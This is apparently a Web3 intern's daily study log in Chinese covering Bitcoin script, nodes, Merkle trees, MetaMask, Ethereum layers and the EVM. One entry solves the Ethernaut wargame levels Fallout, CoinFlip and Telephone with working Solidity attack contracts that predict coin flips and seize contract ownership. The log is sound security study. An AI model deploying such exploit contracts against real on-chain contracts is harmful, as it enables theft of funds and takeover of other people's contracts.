---
timezone: UTC+8
---

# mayuxiang

**GitHub ID:** mayuxaing

**Telegram:** @Ma_0xFly

## Self-introduction

Web3 实习计划 2025 冬季实习生

## Notes

<!-- Content_START -->
# 2026-01-22
<!-- DAILY_CHECKIN_2026-01-22_START -->
以太航员  

\# fallout

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {

using SafeMath for uint256;

//把 SafeMath 库里所有 以 uint256 作为第一个参数 的函数，“挂”到 uint256 类型

之后写 x.add(y) 就能自动转成 SafeMath.add(x, y) ，防止加减乘除溢出。

mapping(address => uint256) allocations;

address payable public owner;

/\* constructor \*/

function Fal1out() public payable {

owner = msg.sender;

allocations\[owner\] = msg.value;

}

modifier onlyOwner() {

require(msg.sender == owner, "caller is not the owner");

\_;

}

function allocate() public payable {

allocations\[msg.sender\] = allocations\[msg.sender\].add(msg.value);

}

function sendAllocation(address payable allocator) public {

require(allocations\[allocator\] > 0);

allocator.transfer(allocations\[allocator\]);

}

function collectAllocations() public onlyOwner {

msg.sender.transfer(address(this).balance);

}

function allocatorBalance(address allocator) public view returns (uint256) {

return allocations\[allocator\];

}

}

\`\`\`

该关卡的要求是获取合约的owner

\`\`\`solidity

/\* constructor \*/

function Fal1out() public payable {

owner = msg.sender;

allocations\[owner\] = msg.value;

}

\`\`\`

构造函数名称与合约名称不一致使其成为一个public类型的函数，即任何人都可以调用，同时在构造函数中指定了函数调用者直接为合约的owner，所以我们可以直接调用构造函数Fal1out来获取合约的ower权限。

\# CoinFlip

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract CoinFlip {

uint256 public consecutiveWins;

uint256 lastHash;

uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor() {

consecutiveWins = 0;

}

function flip(bool \_guess) public returns (bool) {

uint256 blockValue = uint256(blockhash(block.number - 1));

if (lastHash == blockValue) {

revert();

}

lastHash = blockValue;

uint256 coinFlip = blockValue / FACTOR;

bool side = coinFlaip == 1 ? true : false;

if (side == \_guess) {

consecutiveWins++;

return true;

} else {

consecutiveWins = 0;

return false;

}

}

}

\`\`\`

抛硬币 游戏合约，

游戏逻辑（理想版）

用上一区块的哈希 blockhash(block.number-1) 做随机源

哈希除以一个大数 FACTOR ，把最高位挤出来当 0/1

猜对了 consecutiveWins++ ，猜错清零

但是blockhash可预测

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './CoinFlip.sol';

contract Hack {

CoinFlip public immutable target;

uint256 private constant FACTOR =

57896044618658097711785492504343953926634992332820282019728792003956564819968;

constructor(address \_target) {

target = CoinFlip(\_target);

}

/// 必须在新区块里调用，否则 revert

function attack() external {

uint256 blockValue = uint256(blockhash(block.number - 1));

require(blockValue != 0, "block too early");

uint256 coinFlip = blockValue / FACTOR;

bool side = coinFlip == 1;

target.flip(side); // 百发百中

}

}

\`\`\`

\# Telephone

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract Telephone {

address public owner;

constructor() {

owner = msg.sender;

}

function changeOwner(address \_owner) public {

if (tx.origin != msg.sender) {

owner = \_owner;

}

}

}

\`\`\`

让msg.sender与tx.origin不相同即可，使用合约就可以实现。

\+ `tx.origin` 是发起整个交易的外部账户（钱包地址）。

\+ `msg.sender` 是当前调用者（可能是合约或外部账户）。

如果情景是直接由钱包调用合约，两者相同 ，但是如果是在多个合约的情况下，比如用户通过b合约来调用a合约，那么对于a合约来说，msg.sender就代表合约b，而tx.origin就代表用户钱包地址，所以我们这里需要另外部署一个合约来调用这儿的changeOwner：

\`\`\`solidity

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import './Telephone.sol';

contract exp{

Telephone public immutable target;

address public owner;

constructor(){

owner = msg.sender;

//在 Solidity 中`msg.sender` 表示当前调用这个函数的实体；

//所以这里 \`msg.sender

//会是你的钱包地址；因此构造函数执行时，将部署者地址写入 owner

target=Telephone(0x3d79CEeF1F3665587D4D20F1f2030C4aC097c1E9);//目标合约地址

}

function attack() public {

target.changeOwner(owner);

}

}

\`\`\`
<!-- DAILY_CHECKIN_2026-01-22_END -->

# 2026-01-21
<!-- DAILY_CHECKIN_2026-01-21_START -->

ai与web3

主题围绕 AI Agent（智能体）与 Web3 的结合，重点阐述了为什么 AI 需要 Web3 基础设施（身份、支付、可验证性），以及 SpoonOS 如何通过协议层（X402, C8004）和应用层解决这些问题。

背景与趋势 (The Shift to Agentic AI)

演进：AI 已从 2023 年的“聊天机器人”（Chatbot/Copilot）进化为 2026 年的“打工者”（Agent）。

区别：传统 LLM（无状态、无工具、无身份） vs. AI Agent（有记忆、有工具、有身份）。

核心痛点：Web2 架构下，AI 是“黑户”，缺乏独立身份、银行账户和可信的审计记录。

Web2 基础设施的三大缺失

身份缺失 (Identity)：无法验证请求发起者是人还是 AI，导致商业间谍、女巫攻击等问题。

不可审计 (Auditability)：AI 决策日志存储在中心化服务器，可被篡改，导致法律追责困难。

支付与结算障碍 (Payment)：传统金融（信用卡）不支持 AI 的高频、微额（0.001美元）交易，且结算周期长（T+1/T+3），无法满足 AI 秒级交互需求。

Web3 解决方案与架构

总览：Web3 为 AI 提供了“不可伪造的身份证”和“可编程的银行账户”。

协议层：

X402 协议 (Payment)：基于 HTTP 402 "Payment Required" 状态码，实现机器原生的微支付，支持毫秒级结算，无需注册/登录。

C8004 标准 (Identity)：AI 的“链上护照”。基于 ERC-721 实现，包含身份注册（Metadata）、信誉系统（基于链上交易的评分）、验证器（ZKML/TEE 证明）。

应用层 (SpoonOS)：

定位为 AI Agent 的“操作系统”或 SDK，封装了复杂的密钥管理、签名、链上交互。

四层架构：输入层（数据采集）-> 核心层（LLM/记忆/编排）-> 协议层（身份/支付）-> 输出层（DeFi/跨链操作）。

未来展望

机器经济（Machine Economy）将超越人类经济，稳定币交易量已超 Visa。

未来经济主体是数以亿计的 AI，它们需要 Web3 网络来承载高并发的价值流转。
<!-- DAILY_CHECKIN_2026-01-21_END -->

# 2026-01-20
<!-- DAILY_CHECKIN_2026-01-20_START -->


现在的WEB3生态，已经不是一个简单的比特币网络了，它演化成了一个庞大复杂的数字国家。我们可以用分层的方式来拆解它，就像理解一个城市的：地基、公路、水电煤、商业区。

!\[\[图库/4ed22e773aad38a08722fec6d1b90893\_MD5.png\]\]

\## 基础设施层 L0→L3

\### L0 底层传输层

它的主要作用是解决不同区块链，如比特币、以太坊、波卡等之间的通信和价值传输问题。

其代表项目有Polkadot和Cosmos。

这些项目并不想各自单独构建一个封闭的城市，而是致力于打造一个连接所有城市的国家高速公路网，实现区块链之间的互联互通。

\### L1 底层区块链

相当于城市的地基和基本法。它是一个独立的区块链系统，能够保障自身的安全。

其代表项目包括Bitcoin，被视为数字黄金；Ethereum，被称为世界计算机；Solana以及Avalanche，以高速链著称。

每个独立的区块链就像一座城市，拥有自己的法律体系，即共识机制和税收系统，也就是Gas费。

\### L2 扩容方案

类似于城市的高架桥和地铁。

由于在L1主链上进行交易，存在拥堵且手续费高昂的问题，所以L2扩容方案在主链旁边构建了高速通道，用于处理大量的小额交易，最终再将交易结果传回主链进行结算。

其核心目标是提升区块链的扩展性。代表项目有Optimism、Arbitrum以及Lightning Network。

L2扩容方案对支付领域意义重大！未来海量的微支付交易几乎必然会发生在L2上，因为其手续费极低且交易速度极快。

\### L3 应用链

就如同城市里的某个大型主题乐园。

当某个大型应用觉得在公共链上发展受到限制时，就会基于L2或L1的技术，搭建一个为自己量身定制的专属链。

目前的一种代表趋势是基于Cosmos SDK或OP Stack来构建特定应用链。

\## 中间件层，城市的水电煤

这一层不直接面向最终用户，但为上层应用提供关键服务。没有它们，应用层就是空中楼阁。

\### 预言机，区块链的事实来源

区块链本身是一个相对封闭的系统，无法直接获取链外的股票价格、天气数据、比赛结果等真实世界的信息。

!\[\[图库/5e7ecb1994fc21a113fdc59252602a3b\_MD5.png\]\]

图片来源：csdn-wonderBlock-预言机

而预言机就如同区块链的事实来源，负责将外部真实世界的数据可靠地传输给区块链上的智能合约。其代表项目是Chainlink。

举个例子

一个去中心化金融DeFi借贷协议需要实时了解以太坊ETH的价格，以此判断是否要对抵押资产进行清算，而这个ETH的实时价格数据就是由Chainlink提供的。

\### 节点服务，WEB3的云计算服务

节点服务相当于WEB3领域的云计算服务。并非每个开发者都愿意自己搭建节点来与区块链进行交互，节点服务提供商就应运而生。

这些公司会提供现成的应用程序编程接口，让开发者能够轻松地查询链上数据、发送交易。其代表项目有Infura和Alchemy。

对于WEB2开发者而言，节点服务是他们进入WEB3世界最常用的桥梁或工具。

\### 索引协议，区块链数据的搜索引擎

索引协议的作用类似于百度或谷歌。

由于区块链上的数据量极为庞大，犹如一片数据的海洋，那么如何才能快速查询到某个地址的所有交易记录呢？索引协议能够帮助高效地组织和查询这些数据。其代表项目是The Graph。

\## 应用层，普通人能看到的商业区

建立在底层设施之上、直接面向用户的应用层，是创新与财富效应最为集中的领域。

\### **DeFi，去中心化金融：以代码重构华尔街**

DeFi利用代码重新构建了整个华尔街的金融体系。无需银行、券商、交易所等传统中介机构，便可实现：

借贷，如Aave、Compound；交易，如Uniswap、Sushiswap；衍生品交易，如dYdX；生息，如Yearn等所有金融活动。

其核心创新在于AMM，自动化做市商机制，以Uniswap为例，它允许任何人无需许可地为任意交易对提供流动性，即做市，并赚取费用，彻底颠覆了传统的订单簿模式。

\### **NFT，非同质化代币：数字所有权凭证**

NFT是数字所有权证书，它不仅仅局限于JPEG图片，更是任何独一无二的数字资产，甚至实物资产的所有权凭证。

!\[\[图库/1c3434f245fcf777e819e7d171788345\_MD5.png\]\]

其应用场景广泛，涵盖：

数字艺术，如CryptoPunks；藏品，如NBA Top Shot；游戏资产，如Axie Infinity；身份认证，如域名ENS；门票、房地产等多个领域。

\### **DAO，去中心化自治组织：以代码制定规则的社区与公司**

DAO是通过代码设定规则的公司或社区。成员通过持有代币进行投票决策，社区或公司的金库资金由多签钱包或智能合约管理，实现了无人化管理与全球协同。

!\[\[图库/94abec4b8cbe54f362ccaf283133f59e\_MD5.png\]\]

代表项目有ConstitutionDAO，曾试图拍卖美国宪法；BitDAO，大型风投DAO等。
<!-- DAILY_CHECKIN_2026-01-20_END -->

# 2026-01-19
<!-- DAILY_CHECKIN_2026-01-19_START -->



\## 脚本

\### 一、本质

比特币脚本根本不是“编程语言”，它是一个被故意打残的、不可图灵完备的 Forth 系栈机。

唯一任务：在你花钱那一刻，回答一个问题——「这笔 UTXO 现在能不能被花？」。

比特币里根本没有“账户余额”，只有一堆带锁的小钱箱（UTXO）

每个 UTXO 就是一个结构体，里面只有两样关键东西：

\+ 多少 BTC

\+ 一段“锁脚本”（ScriptPubKey）

想花它，就必须给矿工证明：我能配出一段“解锁脚本”，把它和锁脚本拼接后，在比特币虚拟机里执行结果为 TRUE。

\### 二、核心设计限制（为什么这么残）

\+ 无循环、无跳转（彻底杜绝 while、for、goto）

\+ 栈最大 1000 项，脚本最大 10 000 字节（防栈溢出、DoS）

\+ 大量 opcode 早被 Satoshi 永久禁用（OP\_CAT、OP\_MUL、OP\_AND 等）

\+ 不能读取链上其他状态、不能读时间（除非你主动塞进交易里）

\+ 执行路径 100% 确定，任何节点跑出来结果都一模一样

→ 相当于一个开了全防护（canary + RELRO + seccomp + no-exec-stack）的超残血 VM

\### 三、上锁 vs 解锁完整流程（P2PKH 现场打靶）

UTXO 里永远只存一把锁（Locking Script = ScriptPubKey）

最常见写法（1… 和 bc1q… 地址）：

\`\`\`plain

OP\_DUP OP\_HASH160 <20字节 pubkeyhash> OP\_EQUALVERIFY OP\_CHECKSIG

\`\`\`

你花钱时在 input 里提供钥匙（Unlocking Script = ScriptSig / Witness）：

\`\`\`plain

<签名> <完整公钥>

\`\`\`

矿工会把这两段拼接成下面这根“ROP 链”，然后丢进脚本虚拟机执行：

\`\`\`plain

<签名> <公钥> OP\_DUP OP\_HASH160 <pubkeyhash> OP\_EQUALVERIFY OP\_CHECKSIG

\`\`\`

执行过程逐条 opcode（你自己推栈就能 100% 复现）：

| 步骤 | 操作 | 栈（从底→顶） | 备注 |

| --- | ------------------- | ------------------------------ | ------------------- |

| 1 | push 签名 | \[sig\] | |

| 2 | push 公钥 | \[sig, pubkey\] | |

| 3 | OP\_DUP | \[sig, pubkey, pubkey\] | 复制一份公钥 |

| 4 | OP\_HASH160 | \[sig, pubkey, hash160(pubkey)\] | 计算公钥哈希 |

| 5 | push 锁里的 pubkeyhash | \[sig, pubkey, h1, h2\] | |

| 6 | OP\_EQUALVERIFY | \[sig, pubkey\] | h1 == h2？不相等直接 Fail |

| 7 | OP\_CHECKSIG | \[TRUE 或 FALSE\] | 用公钥验签，验证是否对本交易签名 |

最后栈顶剩下非零值（TRUE）→ 矿工放行，钱归你花。
<!-- DAILY_CHECKIN_2026-01-19_END -->

# 2026-01-16
<!-- DAILY_CHECKIN_2026-01-16_START -->




\## 比特币节点

**比特币节点（Bitcoin Node）= 参与比特币网络的计算机**，运行Bitcoin Core 或其他兼容实现。

节点的三项主要工作：

1\. **验证区块与交易**（共识规则）

2\. **维护区块链数据**

3\. **转发数据给其他节点（P2P 网络）**

\### 🧱 全节点（Full Node）

全节点会 **下载完整区块链数据**，并 **独立验证所有历史交易和区块**。

\+ 下载所有区块（> 500 GB）

\+ 对每一条交易重新执行验证规则

\+ 自己决定某笔交易是否合法

（不依赖任何第三方）

\#### 权限级别

全节点 = **最可信**

它只相信自己验证过的结果。

\#### 👍 优点

\+ 最高安全性

\+ 不信任别人

\+ 不会被骗（double-spend 陷阱等）

\#### 👎 缺点

\+ 占用大存储

\+ 同步时间长（首次同步很慢）

\### 🪶 轻节点（Light Node / SPV Node）

轻节点 **不下载完整区块链**，只下载：

\+ 区块头（header）

\+ 少量相关验证信息（Merkle proof）

轻节点依赖全节点帮它验证交易。

\#### 📦 SPV（Simplified Payment Verification）

轻节点通过 SPV 技术验证交易：

\+ 不复算所有交易

\+ 只检查交易是否出现在某个区块（Merkle 路径）

\+ 相信全节点广播的信息

\#### 👍 优点

\+ 小、快、无需大量空间

\+ 适合手机、网页钱包

\#### 👎 缺点

\+ 必须信任全节点提供的数据

\+ 存在被欺骗的可能（误导的区块信息）

\---

\### 📌为什么比特币需要轻节点？

因为：

\+ 手机存不下 500+ GB 的链数据

\+ 同步太慢

\+ 用户需要快速参与网络

轻节点用 SPV 方式让普通设备也能参与验证（虽然不完全可信）。
<!-- DAILY_CHECKIN_2026-01-16_END -->

# 2026-01-15
<!-- DAILY_CHECKIN_2026-01-15_START -->





\## 区块结构

区块头

!\[\[图库/45f941bff426ac8f15fa644d236c5101\_MD5.jpg\]\]

| 字段 | 含义（简洁） | pwn 类比 |

| ----------------------- | --------------- | ----------------------- |

| **Version** | 节点使用哪代规则 | “struct version 字段” |

| **Previous Block Hash** | 指向上一个区块 | 链表里的 `prev`<br/> 指针 |

| **Merkle Root** | 所有交易的哈希树根 | 整个交易池的“总校验和” |

| **Timestamp** | 区块时间戳 | 日志的 timestamp 字段 |

| **nBits（target）** | 挖矿难度 | 你设置的过关条件 |

| **Nonce** | 为找到目标哈希而不断变的随机数 | brute force fuzzing 随机值 |

\## 数据结构Merkle hash（保证区块不可篡改）

**Merkle Hash = 把大量数据分层哈希形成一棵树，最后得到一个根哈希（Merkle Root）用作整体的校验证明。**

换句话说：

它是一个 **多级 hash 结构**，用来证明“某个数据属于某个大集合”。 如一笔交易 Tx）确实属于某个 Merkle Root 对应的集合。

例如：

你从区块头里看到 Merkle Root = R，

现在别人告诉你：Tx3 在这个区块，他给了你一组 Merkle 证明（Merkle Proof）

**这样首先是极大地提高了区块链的运行效率和可扩展性，使得区块头只需包含根哈希值而不必封装所有底层数据，这使得哈希运算可以高效地运行在智能手机甚至物联网设备上；其次是Merkle Tree可支持“简化支付验证协议”（SPV），即在不运行完整区块链网络节点的情况下，也能够对交易数据进行检验。**

!\[\[图库/9f1f1cb18a33d3e8768c7332f4a4e0b4\_MD5.webp\]\]

\## 网络

**比特币的 P2P 网络就是一个没有中心服务器的节点广播网络，所有节点互相直接通信，交换交易和区块。**

\+ 不需要服务器

\+ 不需要许可

\+ 任意节点都能加入

\+ 所有数据靠广播同步

就像一个“去中心化聊天室”，只是大家不是发消息，而是发交易和区块。

\### 网络是怎么连接的？

每个节点启动时会：

1\. 连接一些已知的 seed 节点（DNS seeds）

2\. 获取其他节点的 IP（地址簇）

3\. 随机挑选若干个节点建立 TCP 连接（通常 8 个出向连接），即邻居节点，但是不在物理相邻

之后节点之间就保持长连接，互相交换数据包。

\---

\### 数据传播（Gossip 协议）

比特币使用一种很简单的 **gossip（八卦式）传播机制**：

1\. 节点收到一笔交易/区块

2\. 只告诉一部分邻居 “我有新东西”

3\. 对方如果没有，就来请求

4\. 然后继续传播给它的邻居

最终数据会快速扩散到全网。

\---

\### 如何防垃圾/攻击？

比特币网络有若干保护措施：

\+ **Rate limiting**：限制发送频率

\+ **Ban score**：恶意行为会被拉黑一段时间

\+ **数据结构验证**：收到的消息必须符合协议格式

\+ **区块/交易必须满足共识规则**，否则不传播

\---

\### 节点主要交换哪些数据？

节点之间的消息有几类（精简）：

\+ `inv`：我这里有新交易/区块

\+ `getdata`：我要这个数据

\+ `tx`：传交易

\+ `block`：传区块

\+ `ping/pong`：保持连接

\+ `addr`：分享节点 IP

属于一个非常经典的 P2P 协议。
<!-- DAILY_CHECKIN_2026-01-15_END -->

# 2026-01-14
<!-- DAILY_CHECKIN_2026-01-14_START -->






\# 钱包地址生成逻辑

!\[\[图库/dfa1465c6710908114e7c40bbffa7e06\_MD5.jpg\]\]

\# 钱包作用

一句话概括

**MetaMask 是一个以太坊钱包 + 浏览器插件，用来管理你的私钥、存放资产、发交易，并让你在网页上直接使用区块链应用（DApp）。**

就像：

**它是你在区块链世界的“钥匙串 + 浏览器驱动 + 交易签名器”。**

| **功能** | **作用** |

| ----------- | ------------------------- |

| **私钥管理** | **保存并加密你的助记词/私钥** |

| **资产管理** | **显示 ETH / ERC20 / NFT** |

| **交易签名** | **每笔链上动作都要它签名** |

| **DApp 连接** | **登录、swap、mint、GameFi** |

| **多链支持** | **以太坊 + Polygon + BSC 等** |

\## MetaMask 的核心功能

\### **1️⃣**\*\* 管理你的私钥（最重要）\*\*

\+ MetaMask 本质是一个“私钥管理器”，帮你安全存储私钥/助记词。

\+ 私钥永远不会上传网络，只在本地加密保存。

🔐 **你签的每笔链上交易，都是 MetaMask 帮你用私钥签出来的。**

\---

\### **2️⃣**\*\* 发送和接收加密资产\*\*

\+ 你可以在钱包里收发 ETH、USDT、NFT 等 ERC-20/ERC-721 资产。

\+ MetaMask 会显示你的余额、gas 费、交易记录等。

\---

\### **3️⃣**\*\* 连接去中心化应用（DApp）\*\*

这是最关键的用途。

当你访问 DApp（如 Uniswap、OpenSea、Lens、GameFi 项目）时，网站会弹出：

“Connect to MetaMask”

然后你就可以：

\+ 签名登录（类似 Web2 登录）

\+ 跑 swap、mint NFT、借贷、质押

\+ 玩链游

\+ 使用各种 DeFi 协议

**MetaMask 就是 DApp 的“钱包驱动”。**

\---

\### **4️⃣**\*\* 作为浏览器插件注入 web3 对象\*\*

对前端开发来说，MetaMask 会向网页注入 `window.ethereum`，

让网页可以调用链上 RPC，例如：

\`\`\`plain

ethereum.request({ method: 'eth\_requestAccounts' })

\`\`\`

没有 MetaMask，网页根本没办法签交易或访问你的链上账户。

\### **5️⃣**\*\* 网络切换（主网 & 测试网 & EVM 链）\*\*

MetaMask 支持：

\+ Ethereum 主网

\+ Polygon、BSC、Arbitrum、Optimism 等 EVM 链

\+ Goerli、Sepolia 等测试网

还能自定义 RPC。

等于一个钱包支持全套 EVM 生态。
<!-- DAILY_CHECKIN_2026-01-14_END -->

# 2026-01-13
<!-- DAILY_CHECKIN_2026-01-13_START -->







视频1是 Austin Griffith **“Web2 to Web3” 四周特训营**的开篇介绍，核心要点：这是从传统开发转向 Solidity 开发的路线图，强调动手实践（Shipping），并将“安全审计”定义为技术进阶的终极目标。

\### 扩展层（Layer2）

**为什么需要 Layer2**

1\. **以太坊 L1 吞吐量极低（~15 TPS）**

所有节点必须重复执行所有交易，无法提升执行能力。

2\. **Gas 昂贵、链易拥堵**

大量应用（DeFi、NFT、游戏）无法在 L1 承担高成本。

Layer2 是构建在以太坊 L1 之上的\*\*扩展执行环境\*\*，目标是：

1\. **提高吞吐量（TPS）**

2\. **降低交易成本（Gas）**

3\. **保持以太坊主链安全性（最终性与数据可用性）**

核心思想：

\`\`\`plain

执行在 Layer2，安全在 Layer1。

\`\`\`

L2 将大量计算从 L1 挪到链外，但最终结果仍必须通过 L1 验证或结算。

\#### 两大主流路线

\##### Optimistic Rollup（以“欺诈证明”生效）

**代表：**Optimism、Arbitrum

**执行流程：**

1\. L2 执行所有交易（EVM 等价）

2\. 将交易数据或状态根批量上报至 L1

3\. 假设（optimistic）结果是正确的

4\. 有“挑战窗口”（如 7 天）

5\. 若有人质疑 → 执行 fraud proof，即验证器在 L1 上重放某段执行来检查是否造假

**特点：**

| 指标 | 特性 |

| --- | --- |

| 安全性 | 基于争议解决机制 + 挑战者经济激励 |

| 延迟 | 有挑战窗口（通常几天） |

| 兼容性 | 原生 EVM（Arbitrum Stylus 扩展 WebAssembly） |

| 成本 | 较低 |

\##### 3.2 ZK Rollup（以“有效性证明”生效）

**代表：**zkSync、StarkNet、Scroll、Polygon zkEVM

**核心思路：L1 只需要一次“Verify(proof)”即可确认状态合法。**

\+ L2 执行交易

\+ 构造零知识证明（ZKP）

\+ L1 仅需验证证明（快速、成本低）而无需重放执行

**特点：**

| 指标 | 特性 |

| --- | --- |

| 安全性 | 密码学强保证，无需挑战窗口 |

| 延迟 | 无需等待，可快速 finality |

| 计算成本 | 生成证明耗时高（链下重计算） |

| 兼容性 | zkEVM 系列努力做到与 EVM 字节码等价 |

**ZK 的显著优势：**

\+ 抗攻击性强：结果“数学上正确”，攻击者无法注入错误状态

\+ 低延迟转账和提现

\### 应用层

核心作用：基于以太坊底层技术开发的各类实际应用，是 “世界计算机” 的 “软件应用程序”，直接面向用户提供服务

常见应用类型：

去中心化金融（DeFi）：如借贷平台（Aave）、去中心化交易所（Uniswap）

非同质化代币（NFT）：如数字艺术品交易（OpenSea）、NFT 游戏

去中心化应用（DApp）：如社交应用、供应链溯源应用等

核心特点：依托底层四层结构的安全性与去中心化特性，无需依赖中心化机构即可运行，用户对自身数据与资产拥有更高控制权

\## DApp

\### 1. 核心定义：什么是 dApp？

\> **dApp = 链上智能合约（后端） + 链下用户界面（前端）**

它不像传统 App 那样把后端代码跑在阿里云或 AWS 的中心化服务器上，而是把核心逻辑（资金处理、业务规则）部署在\*\*以太坊区块链\*\*上。

• dApp 的后端代码 （智能合约）运行在以太坊主网或其 Rollup （二层网 络）之上的 EVM 中，由全网节点共同执行和记录；

• dApp 的前端可以用任意 Web / App 技术编写，既可以放在传统服务器 上，也可以托管在 IPFS、Arweave 等去中心化存储上。

\### 2. 架构对比：Web2 vs Web3

\- **传统 App (Web2)**：

\- **后端**：中心化服务器（可随时关机、随时由管理员修改数据）。

\- **信任模型**：信任“公司”不作恶。

\- **dApp (Web3)**：

\- **后端**：智能合约（运行在去中心化的 EVM 节点网络中）。

\- **数据**：存储在公开透明的区块链上。

\- **信任模型**：信任“代码”和“共识规则”（Code is Law）。

\### 3. dApp 的关键特性（双刃剑）

\- **零停机时间 (Zero Downtime)**：没有“总机房”，只要以太坊网络还在，后端就永远在线。

\- **抗审查 (Censorship Resistance)**：没有单一机构能按下“删除键”或阻止特定用户交互。

\- **代码不可篡改 (Immutability)**：这是最大的特性，也是最大的挑战。合约一旦部署，逻辑通常就无法直接修改（除非预留了代理升级模式）。
<!-- DAILY_CHECKIN_2026-01-13_END -->

# 2026-01-12
<!-- DAILY_CHECKIN_2026-01-12_START -->








\# 以太坊（世界计算机）

以太坊被称为 “世界计算机”，核心是它突破了比特币仅能处理简单价值转移的局限，靠去中心化架构、图灵完备的智能合约等技术，构建了一个全球可访问、能承载复杂计算与多样化应用的分布式计算平台。下面以计算机五层结构拆解分析

\## 五层结构

\### 硬件层

核心作用：为整个以太坊网络提供物理硬件支持，是 “世界计算机” 的 “硬件主机”

组成部分：全球范围内参与以太坊网络的节点设备，包括个人电脑、服务器、专业矿机（合并后以验证节点设备为主）等

关键特点：去中心化分布，无单一控制中心，节点越多，网络安全性、稳定性越强，确保 “世界计算机” 持续运行不宕机

\### 内核层（操作系统层）

核心作用： 在这些不可信硬件上，实现“一个统一的状态机 + 资源调度”

核心功能：pos权益证明机制，gas机制

1\. 把所有节点连成一个 P2P 网络（网络子系统）

2\. 在节点之间达成“\*\*谁的区块算数\*\*”的共识（共识子系统）

3\. 控制“\*\*谁先来打包交易谁来验证交易、每个区块能装多少东西\*\*”（调度/调度器）

4\. 控制“\*\*每个操作要花多少资源 / 钱\*\*”（资源管理：Gas & Fee Market）

5\. 把“执行层（EVM）”的状态转移结果纳入全局（状态机转移接口）

\#### pos权益证明机制

当前共识机制：权益证明（PoS），取代原有的工作量证明（PoW）

原理：节点通过质押一定数量的 ETH 成为验证者，按规则打包交易、生成区块，合规则验证者获得奖励，违规者将被惩罚（扣除质押的 ETH）

优势：降低能源消耗，提升网络效率，同时通过 “质押成本” 保障节点诚实性

\#### gas

1\. **资源计量与成本化**

所有 EVM 操作（opcode）都有固定 gas 消耗，gas 用于精确计量“计算量 + 存储 + 带宽”。

通过让执行成本显式化，确保链上资源稀缺可定价。

2\. **防止 DoS 与无限计算**

交易必须预付 gas，执行过程中 gas 用尽会被中止。

这使得任何无限循环、恶意大计算、垃圾交易都无法无成本消耗网络资源。

3\. **交易排序与拥堵调节（Fee Market）**

Gas price/priority fee 作为经济信号，在拥堵情况下让用户竞争区块空间。

节点根据费用从高到低选择交易，实现市场化调度。

总结：

**Gas = 区块链的资源管理系统，负责计量成本、防 DoS、调节交易优先级，是以太坊作为“世界计算机”能稳定运行的关键内核机制。**

\### 处理层（以太坊虚拟机EVM，全球同步的软件CPU）

EVM 是以太坊上的 **虚拟 CPU + 沙箱执行环境**，专门用来运行智能合约。它执行 bytecode，确保所有节点执行结果一致（确定性）。

\#### EVM 的执行模型（Execution Model）

EVM 执行一笔交易主要包含以下步骤：

1\. 加载交易

交易包含 to、value、data，用作智能合约调用的入口。

2\. 初始化执行上下文

包含：

\+ 程序计数器 PC

\+ 栈（stack）

\+ 内存（memory）

\+ 存储（storage）

\+ gas（燃料配额）

3\. 逐条执行 opcode

EVM 执行汇编级操作，包括算术、控制流、调用、存储、日志等。

4\. gas 用尽则 revert

执行中 gas 不够，会回滚所有状态修改，但已消耗的 gas 不退还。

\---

\#### EVM 的内存结构（Stack/Memory/Storage）

栈（Stack）

\+ LIFO 栈

\+ 最大深度 1024

\+ 所有 opcode 参数都来自栈顶

内存（Memory）

\+ 执行期间的临时数据区

\+ 线性扩展，执行结束即清空

存储（Storage）

\+ 合约的持久化状态

\+ 写入非常贵（类似写磁盘）

\---

\#### 合约间调用（CALL / DELEGATECALL）

CALL

\+ 新建一个独立的执行上下文

\+ 自己用自己的 storage

\+ 能转 ETH

DELEGATECALL

\+ 使用 **被调用合约的代码**

\+ 使用 **调用者的 storage（非常危险）**

\+ 是代理合约与许多漏洞的源头

（类比：把别人的函数在你的进程里执行，并用你的全局变量）

\---

\#### Solidity → EVM 的编译流程

1\. Solidity 源码

2\. 编译为 Yul（中间 IR）

3\. 编译为 EVM bytecode

4\. 部署到链上

5\. 由 EVM 逐条执行指令

（类比：C → LLVM IR → 汇编 → 机器码 → CPU）

\---

\#### EVM 的局限性

\+ 是纯栈机（无寄存器）

\+ 无浮点数

\+ 内存只增大不缩小

\+ CALL 返回值要手动检查

\+ DELEGATECALL 容易被利用

\+ 无线程和并发
<!-- DAILY_CHECKIN_2026-01-12_END -->
<!-- Content_END -->
